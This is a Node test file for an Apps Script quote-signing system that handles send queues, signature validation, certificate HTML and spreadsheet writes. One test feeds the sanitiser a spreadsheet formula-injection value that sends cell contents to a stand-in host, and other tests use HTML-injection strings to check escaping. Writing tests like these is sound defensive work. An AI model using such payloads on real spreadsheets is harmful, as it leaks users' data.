import test from 'node:test';
import assert from 'node:assert/strict';
import {readFileSync} from 'node:fs';
import vm from 'node:vm';
import schema from '../lib/domain/schema.json' with {type:'json'};

// Load both Apps Script files into one context, as they share one project.
const ctx=vm.createContext({});
for(const f of ['document-import.gs','quote-signing.gs'])vm.runInContext(readFileSync(new URL(`../apps-script/${f}`,import.meta.url),'utf8'),ctx);
const {SIGN_HEADERS,CASE_SIGN_HEADERS,QUOTE_SIGN_HEADERS,addWorkingDays,isoDay,isEmail,planSendQueue,findSignatureByTokenHash,pageStateFor,planSignedCase,buildSignEmail,escapeHtml,previousSendFor,planEffectiveQuotes,voidsForCase,sendFailureNote,clearSendFailureNote,signBlockReason,validateSignature,buildCertificateHtml,signedDocumentRow,planSuperseded,quoteGroupKeys,signPageHtml_,sheetSafe,sheetSafeRow,missingHeaders,adminAllowed,pruneTries}=ctx;

const signHeaders=Object.values(SIGN_HEADERS);
const sig=(o)=>{const r=signHeaders.map(()=>'');for(const[k,v]of Object.entries(o))r[signHeaders.indexOf(SIGN_HEADERS[k])]=v;return r;};
const queued=(id,caseId,extra={})=>sig({id,quoteId:'quo_'+id,caseId,sourceId:'doc_'+id,recipientEmail:'buyer@example.com',status:'待寄送',...extra});

const caseHeaders=Object.values(schema.collections.cases.columns);
const caseRow=(o)=>{const r=caseHeaders.map(()=>'');for(const[k,v]of Object.entries(o))r[caseHeaders.indexOf(CASE_SIGN_HEADERS[k])]=v;return r;};

test('signing script reads columns the dashboard schema defines',()=>{
 for(const h of Object.values(CASE_SIGN_HEADERS))assert.ok(caseHeaders.includes(h),`案件商機 ${h}`);
 const quoteHeaders=Object.values(schema.collections.quotes.columns);
 for(const h of Object.values(QUOTE_SIGN_HEADERS))assert.ok(quoteHeaders.includes(h),`報價版本 ${h}`);
 assert.equal(schema.collections.cases.sheet,'案件商機');
 assert.equal(schema.collections.quotes.sheet,'報價版本');
 assert.ok(!Object.values(schema.collections).some(c=>c.sheet==='簽署'),'簽署 is a new sheet, not one the dashboard validates yet');
});

test('working days skip weekends',()=>{
 assert.equal(addWorkingDays('2026-11-17',10),'2026-12-01'); // Tue + 10 working days
 assert.equal(addWorkingDays('2026-11-20',1),'2026-11-23'); // Fri -> Mon
 assert.equal(addWorkingDays('2026-11-21',1),'2026-11-23'); // Sat -> Mon
});

test('dates from the sheet become yyyy-mm-dd',()=>{
 assert.equal(isoDay('5/20/2026'),'2026-05-20');
 assert.equal(isoDay('2026-12-1'),'2026-12-01');
 assert.equal(isoDay(new Date(2026,10,17)),'2026-11-17');
 assert.equal(isoDay(''),'');
 assert.equal(isoDay('明天'),'');
});

test('recipient must be one e-mail address',()=>{
 assert.ok(isEmail('a@b.co'));
 assert.ok(!isEmail('a@b.co, c@d.co'));
 assert.ok(!isEmail('陳先生'));
});

test('send queue: send valid rows, flag invalid ones, void older open links of the same case, expire overdue',()=>{
 const rows=[
  sig({id:'sig_old',caseId:'case_A788',status:'已寄送',dueDate:'2026-12-01'}),
  sig({id:'sig_late',caseId:'case_A700',status:'已檢視',dueDate:'2026-11-10'}),
  sig({id:'sig_fine',caseId:'case_A701',status:'已寄送',dueDate:'2026-12-01'}),
  queued('sig_new','case_A788'),
  queued('sig_bad','case_A702',{recipientEmail:'陳先生'}),
  sig({id:'sig_done',caseId:'case_A788',status:'已簽回'}),
 ];
 const plan=planSendQueue(signHeaders,rows,'2026-11-17');
 assert.deepEqual([...plan.send],[3]);
 assert.deepEqual([...plan.invalid.map(p=>[p.index,p.reason])],[[4,'收件人Email 格式不正確']]);
 assert.deepEqual([...plan.void.map(v=>[v.index,v.by])],[[0,'sig_new']]);
 assert.deepEqual([...plan.expire],[1]);
});

test('a missing header names the sheet',()=>{
 assert.throws(()=>planSendQueue(['簽署ID'],[], '2026-11-17'),/「簽署」分頁找不到欄位「報價ID」/);
});

test('token lookup and page state',()=>{
 const rows=[sig({id:'a',tokenHash:'h1'}),sig({id:'b',tokenHash:'h2'})];
 assert.equal(findSignatureByTokenHash(signHeaders,rows,'h2'),1);
 assert.equal(findSignatureByTokenHash(signHeaders,rows,'nope'),-1);
 assert.equal(findSignatureByTokenHash(signHeaders,rows,''),-1);
 assert.equal(pageStateFor('已寄送','2026-12-01','2026-11-17'),'open');
 assert.equal(pageStateFor('已檢視','2026-11-10','2026-11-17'),'expired');
 assert.equal(pageStateFor('已作廢','','2026-11-17'),'voided');
 assert.equal(pageStateFor('已簽回','','2026-11-17'),'signed');
 assert.equal(pageStateFor('待寄送','','2026-11-17'),'invalid');
 // A sent link without a readable expiry date is not signable.
 assert.equal(pageStateFor('已寄送','','2026-11-17'),'invalid');assert.equal(pageStateFor('已檢視',null,'2026-11-17'),'invalid');
});

test('first signature fills the deal fields and marks the case won',()=>{
 const plan=planSignedCase(caseHeaders,caseRow({id:'case_A788',status:'已報價待確認'}),'2026-11-20','doc_signed1');
 assert.deepEqual({...plan.set},{signedSourceId:'doc_signed1',decisionDate:'2026-11-20',status:'已成交'});
 assert.equal(plan.revision,false);
 assert.equal(plan.conflicts.length,0);
});

test('a re-signed revision keeps the original deal date and fills the revision fields',()=>{
 const row=caseRow({id:'case_A780',status:'已成交',signedSourceId:'doc_first',decisionDate:'9/30/2026'});
 const plan=planSignedCase(caseHeaders,row,'2026-11-20','doc_second');
 assert.equal(plan.revision,true);
 assert.deepEqual({...plan.set},{revisionSignedDate:'2026-11-20',revisionSignedSourceId:'doc_second'});
});

test('filled cells are never overwritten; differences go to review',()=>{
 const row=caseRow({id:'case_A788',status:'未成交',decisionDate:'11/18/2026'});
 const plan=planSignedCase(caseHeaders,row,'2026-11-20','doc_signed1');
 assert.deepEqual({...plan.set},{signedSourceId:'doc_signed1'});
 assert.equal(plan.conflicts.length,2);
 assert.match(plan.conflicts[0],/成交決策日已有「2026-11-18」/);
 assert.match(plan.conflicts[1],/商機狀態為「未成交」/);
});

test('marking the same signed document twice changes nothing',()=>{
 const row=caseRow({id:'case_A788',status:'已成交',signedSourceId:'doc_signed1',decisionDate:'11/20/2026'});
 const plan=planSignedCase(caseHeaders,row,'2026-11-20','doc_signed1');
 assert.equal(plan.revision,false);
 assert.deepEqual({...plan.set},{});
 assert.equal(plan.conflicts.length,0);
});

test('signing e-mail carries the link, amount and due date, and escapes HTML',()=>{
 const m=buildSignEmail({title:'A788 <示範品牌>',gross:'1,234,567',recipientName:'陳先生',link:'https://script.google.com/macros/s/X/exec?t=abc',due:'2026-12-01'});
 assert.equal(m.subject,'【沃克思國際有限公司】報價單簽署：A788 <示範品牌>');
 assert.match(m.text,/陳先生 您好/);
 assert.match(m.text,/NT\$ 1,234,567/);
 assert.match(m.text,/exec\?t=abc/);
 assert.match(m.html,/A788 &lt;示範品牌&gt;/);
 assert.ok(!m.html.includes('<示範品牌>'));
 assert.equal(escapeHtml(`"'&`),'&quot;&#39;&amp;');
});

const quoteHeaders=Object.values(schema.collections.quotes.columns);
const quote=(o)=>{const r=quoteHeaders.map(()=>'');for(const[k,v]of Object.entries(o))r[quoteHeaders.indexOf(QUOTE_SIGN_HEADERS[k])]=v;return r;};
const changes=(c)=>[...c.map(x=>[x.index,x.value])];

test('revision before signing: V2 queued voids the open V1 link and the e-mail says it replaces V1',()=>{
 const rows=[
  sig({id:'sig_v1',caseId:'case_A788',status:'已檢視',sentAt:'2026-11-17',dueDate:'2026-12-01'}),
  queued('sig_v2','case_A788'),
 ];
 const plan=planSendQueue(signHeaders,rows,'2026-11-19');
 assert.deepEqual([...plan.send],[1]);
 assert.deepEqual([...plan.void.map(v=>[v.index,v.by])],[[0,'sig_v2']]);
 const prev=previousSendFor(signHeaders,rows,1);
 assert.equal(prev.id,'sig_v1');
 assert.equal(prev.sentDay,'2026-11-17');
 const m=buildSignEmail({title:'A788 V2',gross:3000000,link:'L',due:'2026-12-03',replaces:prev.sentDay});
 assert.match(m.subject,/報價單更新版簽署/);
 assert.match(m.text,/取代 2026-11-17 寄出的版本，先前的確認連結已失效/);
 assert.equal(previousSendFor(signHeaders,[queued('sig_only','case_A790')],0),null,'first send is not an update');
});

test('revision after signing: the new version becomes effective and the old one is switched off',()=>{
 const quotes=[
  quote({id:'quo_v1',caseId:'case_A788',version:'V1',role:'原案',effective:'是'}),
  quote({id:'quo_v2',caseId:'case_A788',version:'V2',role:'原案',effective:'否'}),
  quote({id:'quo_other',caseId:'case_A700',effective:'是'}),
 ];
 assert.deepEqual(changes(planEffectiveQuotes(quoteHeaders,quotes,'case_A788','quo_v2')),[[0,'否'],[1,'是']]);
 const row=caseRow({id:'case_A788',status:'已成交',signedSourceId:'doc_v1signed',decisionDate:'11/20/2026'});
 const plan=planSignedCase(caseHeaders,row,'2026-12-05','doc_v2signed');
 assert.equal(plan.revision,true);
 assert.deepEqual({...plan.set},{revisionSignedDate:'2026-12-05',revisionSignedSourceId:'doc_v2signed'});
});

test('complementary quotes and other quote groups stay effective',()=>{
 const quotes=[
  quote({id:'quo_a',caseId:'case_A776',groupId:'g1',role:'互補',effective:'是'}),
  quote({id:'quo_b',caseId:'case_A776',groupId:'g1',role:'互補',effective:'否'}),
  quote({id:'quo_c',caseId:'case_A776',groupId:'g2',role:'原案',effective:'是'}),
 ];
 assert.deepEqual(changes(planEffectiveQuotes(quoteHeaders,quotes,'case_A776','quo_b')),[[1,'是']]);
 assert.deepEqual(changes(planEffectiveQuotes(quoteHeaders,quotes,'case_A776','quo_missing')),[]);
});

test('an add-on is its own case: queuing it leaves the signed original alone',()=>{
 const rows=[
  sig({id:'sig_main',caseId:'case_A788',status:'已簽回',sentAt:'2026-11-17'}),
  sig({id:'sig_v1open',caseId:'case_A788',status:'已寄送',sentAt:'2026-11-18',dueDate:'2026-12-02'}),
  queued('sig_add','case_A788-addition'),
 ];
 const plan=planSendQueue(signHeaders,rows,'2026-11-20');
 assert.deepEqual([...plan.send],[2]);
 assert.deepEqual([...plan.void],[]);
 assert.equal(previousSendFor(signHeaders,rows,2),null);
 const first=planSignedCase(caseHeaders,caseRow({id:'case_A788-addition',status:'已報價待確認'}),'2026-11-25','doc_add');
 assert.equal(first.revision,false);
 assert.equal(first.set.status,'已成交');
});

test('an older link is voided only for the case whose new quote was actually sent',()=>{
 const rows=[
  sig({id:'sig_a1',caseId:'case_A',status:'已寄送',dueDate:'2026-12-01'}),
  sig({id:'sig_b1',caseId:'case_B',status:'已檢視',dueDate:'2026-12-01'}),
  queued('sig_a2','case_A'),
  queued('sig_b2','case_B'),
 ];
 const plan=planSendQueue(signHeaders,rows,'2026-11-17');
 // case_A's new quote went out, case_B's failed: only case_A's old link may be voided.
 assert.deepEqual([...voidsForCase(plan,'case_A').map(v=>v.index)],[0]);
 assert.deepEqual([...voidsForCase(plan,'case_C')],[]);
 assert.deepEqual([...voidsForCase(plan,'')],[]);
});

test('a row left in 寄送中 is reported as interrupted and never re-sent',()=>{
 const rows=[sig({id:'sig_x',quoteId:'quo_x',caseId:'case_A',sourceId:'doc_x',recipientEmail:'buyer@example.com',status:'寄送中'}),sig({id:'sig_old',caseId:'case_A',status:'已寄送',dueDate:'2026-12-01'})];
 const plan=planSendQueue(signHeaders,rows,'2026-11-17');
 assert.deepEqual([...plan.send],[]);
 assert.deepEqual([...plan.interrupted],[0]);
 assert.deepEqual([...plan.void],[]);
 assert.equal(pageStateFor('寄送中','2026-12-01','2026-11-17'),'invalid');
 assert.equal(pageStateFor('寄送失敗','2026-12-01','2026-11-17'),'invalid');
});

test('send failures count up, keep the existing note and give up at the limit',()=>{
 const a=sendFailureNote('老闆備註','Drive 逾時',3);
 assert.equal(a.notes,'老闆備註 ｜寄送失敗 1/3：Drive 逾時');
 assert.equal(a.giveUp,false);
 const b=sendFailureNote(a.notes,'Drive 逾時',3);
 assert.equal(b.notes,'老闆備註 ｜寄送失敗 2/3：Drive 逾時');
 const c=sendFailureNote(b.notes,'PDF 不符',3);
 assert.equal(c.attempts,3);
 assert.equal(c.giveUp,true);
 assert.equal(c.notes,'老闆備註 ｜寄送失敗 3/3：PDF 不符');
 assert.equal(sendFailureNote('','x',3).notes,'寄送失敗 1/3：x');
 assert.equal(clearSendFailureNote(c.notes),'老闆備註');
 assert.equal(clearSendFailureNote('老闆備註'),'老闆備註');
});

test('only a quote that reached the client can be marked signed',()=>{
 for(const s of ['已寄送','已檢視','已過期'])assert.equal(signBlockReason(s),'',s);
 for(const s of ['草稿','待寄送','寄送中','寄送失敗','已拒絕',''])assert.match(signBlockReason(s),/尚未寄達/,s);
 assert.match(signBlockReason('已作廢'),/最新版本/);
});

const png='data:image/png;base64,'+'A'.repeat(400);
test('a signature needs a name, a drawn PNG and consent',()=>{
 assert.match(validateSignature({name:'',image:png,consent:true}).error,/姓名/);
 assert.match(validateSignature({name:'王小明',image:png}).error,/同意/);
 assert.match(validateSignature({name:'王小明',image:'data:image/png;base64,AAAA',consent:true}).error,/簽名/);
 assert.match(validateSignature({name:'王小明',image:'data:text/html;base64,'+'A'.repeat(400),consent:true}).error,/簽名/);
 assert.match(validateSignature({name:'王小明',image:'data:image/png;base64,'+'A'.repeat(600001),consent:true}).error,/過大/);
 const ok=validateSignature({name:' 王小明 ',title:'採購經理',image:png,consent:true,agent:'x'.repeat(500)});
 assert.equal(ok.name,'王小明');
 assert.equal(ok.imageBase64.length,400);
 assert.equal(ok.agent.length,300);
});

test('certificate shows the signer and the file hash, and escapes what the client typed',()=>{
 const html=buildCertificateHtml({title:'A788 報價單',date:'2026-11-18',gross:1234567,name:'<b>王</b>',signerTitle:'經理',signedAt:'2026-11-18 10:00:00',recipientEmail:'buyer@example.com',signId:'sig_1',filename:'A788.pdf',sha256:'ab'.repeat(32),agent:'UA',imageBase64:'QUJD'});
 assert.ok(html.includes('&lt;b&gt;王&lt;/b&gt;'));
 assert.ok(!html.includes('<b>王</b>'));
 assert.ok(html.includes('ab'.repeat(32)));
 assert.ok(html.includes('NT$ 1,234,567'));
 assert.ok(html.includes('data:image/png;base64,QUJD'));
});

test('the certificate is registered in 文件 in the dashboard column order',()=>{
 const docHeaders=Object.values(schema.collections.documents.columns);
 const row=signedDocumentRow(docHeaders,{id:'doc_abc',filename:'A788-簽回證明.pdf',url:'https://drive.google.com/file/d/abcdefghijk/view',sha256:'ff',caseNumber:'A788'});
 assert.equal(row.length,docHeaders.length);
 assert.deepEqual([...row],['doc_abc','簽回','A788-簽回證明.pdf','https://drive.google.com/file/d/abcdefghijk/view','ff','A788','','','已處理']);
});

test('signing page shows the signature form only while the link is open',()=>{
 const token='a'.repeat(64);
 const open=signPageHtml_({state:'open',title:'A788 <報價>',date:'2026-11-18',gross:100,due:'2026-12-02'},token);
 assert.ok(open.includes('<canvas id="pad">'));
 assert.ok(open.includes('submitSignature'));
 assert.ok(open.includes('A788 &lt;報價&gt;'));
 for(const state of ['signed','voided','expired','declined','invalid']){
  const html=signPageHtml_({state},token);
  assert.ok(!html.includes('<canvas'),state);
  assert.ok(!html.includes(token),state);
 }
});

const quoteHeaders2=Object.values(schema.collections.quotes.columns);
const quo=(o)=>{const r=quoteHeaders2.map(()=>'');for(const[k,v]of Object.entries(o))r[quoteHeaders2.indexOf(QUOTE_SIGN_HEADERS[k])]=v;return r;};
test('a later link replaces the open one of the same quote group, not complementary quotes or other groups',()=>{
 const keys=quoteGroupKeys(quoteHeaders2,[
  quo({id:'quo_v1',caseId:'case_A',groupId:'g1'}),quo({id:'quo_v2',caseId:'case_A',groupId:'g1'}),
  quo({id:'quo_other',caseId:'case_A',groupId:'g2'}),
  quo({id:'quo_c1',caseId:'case_B',groupId:'g3',role:'互補'}),quo({id:'quo_c2',caseId:'case_B',groupId:'g3',role:'互補'}),
 ]);
 const at=(d)=>new Date(2026,10,d);
 const rows=[
  sig({id:'sig_v1',quoteId:'quo_v1',caseId:'case_A',status:'已檢視',sentAt:at(10)}),
  sig({id:'sig_v2',quoteId:'quo_v2',caseId:'case_A',status:'已寄送',sentAt:at(15)}),
  sig({id:'sig_other',quoteId:'quo_other',caseId:'case_A',status:'已寄送',sentAt:at(11)}),
  sig({id:'sig_c1',quoteId:'quo_c1',caseId:'case_B',status:'已寄送',sentAt:at(10)}),
  sig({id:'sig_c2',quoteId:'quo_c2',caseId:'case_B',status:'已寄送',sentAt:at(12)}),
  sig({id:'sig_draft',quoteId:'quo_v2',caseId:'case_A',status:'待寄送'}),
 ];
 assert.deepEqual([...planSuperseded(signHeaders,rows,keys).map(v=>[v.index,v.by])],[[0,'sig_v2']]);
 // A signed newer version also closes the older open link; a signed older one is left as the record it is.
 rows[1]=sig({id:'sig_v2',quoteId:'quo_v2',caseId:'case_A',status:'已簽回',sentAt:at(15)});
 assert.deepEqual([...planSuperseded(signHeaders,rows,keys).map(v=>v.index)],[0]);
 rows[0]=sig({id:'sig_v1',quoteId:'quo_v1',caseId:'case_A',status:'已簽回',sentAt:at(10)});
 rows[1]=sig({id:'sig_v2',quoteId:'quo_v2',caseId:'case_A',status:'已寄送',sentAt:at(15)});
 assert.deepEqual([...planSuperseded(signHeaders,rows,keys)],[]);
});

test('text typed on the public page or taken from a file name stays text in the sheet',()=>{
 assert.equal(sheetSafe('=IMAGE("https://x.test/"&A1)'),'\'=IMAGE("https://x.test/"&A1)');
 for(const v of ['+1','-x','@me'])assert.equal(sheetSafe(v),"'"+v);
 for(const v of ['王小明','A123 報價單.pdf','',0,-5,true,null])assert.equal(sheetSafe(v),v);
 const d=new Date(2026,10,21);assert.equal(sheetSafe(d),d);
 assert.deepEqual([...sheetSafeRow(['evt_1','=1+1',3])],['evt_1',"'=1+1",3]);
});

test('only a known trigger or a signed-in person may run the mail, trigger and write functions',()=>{
 assert.equal(adminAllowed({triggerUid:'123'},['123','456'],''),true);
 assert.equal(adminAllowed(undefined,['123'],'owner@example.com'),true);
 // The public page: nobody signed in, and a made-up trigger id does not help.
 assert.equal(adminAllowed(undefined,['123'],''),false);
 assert.equal(adminAllowed({triggerUid:'999'},['123'],''),false);
 assert.equal(adminAllowed({triggerUid:'123'},[],'  '),false);
});

test('the importer refuses to write when a column it relies on is missing',()=>{
 assert.deepEqual([...missingHeaders(['報價ID',' 案件ID ','來源文件ID'],['報價ID','案件ID','來源文件ID'])],[]);
 assert.deepEqual([...missingHeaders(['報價ID','案件ID','來源文件'],['報價ID','案件ID','來源文件ID'])],['來源文件ID']);
});

test('stored OCR tries keep only files still listed and still without a row, within a size cap',()=>{
 const kept=pruneTries({doc_a:3,doc_b:1,doc_c:2},{doc_b:true},['doc_a','doc_b']);
 assert.deepEqual({...kept},{doc_a:3});
 // Over the cap, files that used up their tries go first; files still being tried stay.
 const capped=pruneTries({x1:3,x2:3,x3:1,x4:2},{},['x1','x2','x3','x4'],3);
 assert.deepEqual(Object.keys(capped).sort(),['x2','x3','x4']);
});

test('a queued row without a case id is not sent',()=>{
 const plan=planSendQueue(signHeaders,[queued('sig_nocase','')],'2026-11-17');
 assert.deepEqual([...plan.send],[]);assert.equal(plan.invalid[0].reason,'缺少案件ID');
});
